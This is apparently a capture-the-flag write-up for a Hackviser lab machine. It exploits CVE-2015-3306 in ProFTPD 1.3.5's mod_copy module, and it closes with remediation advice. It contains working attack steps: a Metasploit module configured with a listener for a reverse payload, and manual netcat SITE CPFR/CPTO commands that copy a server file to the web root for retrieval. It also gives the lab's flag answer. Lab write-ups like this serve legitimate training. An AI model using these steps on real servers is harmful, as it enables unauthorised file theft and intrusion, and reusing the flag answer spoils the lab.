# ProFTPD 1.3.5 - mod_copy Remote Code Execution Writeup
**Platform:** Hackviser | **Category:** Machines | **Difficulty:** Basic
**Topic:** CVE-2015-3306 — ProFTPD mod_copy Misconfiguration

## Overview
This challenge involved exploiting CVE-2015-3306, a vulnerability in ProFTPD 1.3.5. The `mod_copy` module allows unauthenticated users to execute `SITE CPFR` and `SITE CPTO` commands, enabling any file on the server to be copied to the web directory and read over HTTP.

## Methodology

### 1. Reconnaissance
Performed a service version scan to identify running services on the target host (`172.20.24.32`).

```bash
nmap -sV 172.20.24.32
```

**Finding:** Port `21` was open, running **ProFTPD 1.3.5** a version known to be vulnerable to CVE-2015-3306.

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp open  http    Apache httpd 2.4.62 (Debian)
```

### 2. Exploitation Attempt - Metasploit (Failed)
Tried the Metasploit module for this CVE first.

```bash
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 172.20.24.32
set SITEPATH /var/www/html
set LHOST 172.20.24.169
set LPORT 4444
run
```

**Result:** A session briefly opened but immediately dropped. The Metasploit module works by uploading a PHP shell via `mod_copy` and executing it through Apache but PHP was not active on the target, so the payload failed to run.

### 3. Manual Exploitation mod_copy (Successful)
The core of CVE-2015-3306 doesn't require PHP. The `SITE CPFR` and `SITE CPTO` commands can copy any file on the server without authentication.

Connected to the FTP service directly:

```bash
nc 172.20.24.32 21
```

Copied the target file to the web directory:

```
SITE CPFR /secret.txt
SITE CPTO /var/www/html/secret.txt
quit
```

**FTP responses:**
```
350 File or directory exists, ready for destination name
250 Copy successful
```

Retrieved the file over HTTP:

```bash
curl http://172.20.24.32/secret.txt
```


## Findings Summary

| # | Question | Answer |
|---|----------|--------|
| 1 | Open ports | `21, 22, 80` |
| 2 | Vulnerable service | `ProFTPD 1.3.5` |
| 3 | CVE | `CVE-2015-3306` |
| 4 | Vulnerable module | `mod_copy` |
| 5 | Commands used | `SITE CPFR` / `SITE CPTO` |
| 6 | Flag | `Tyrannosaurus` |

## Security Recommendations

1. **Update ProFTPD**: Version 1.3.5 is outdated and should be upgraded immediately.
2. **Disable mod_copy**: If the module is not needed, remove it from the configuration entirely.
3. **Restrict FTP Access**: Limit FTP connections to trusted IP addresses only.
4. **File Permissions**: Sensitive files should not be readable by the FTP process user.
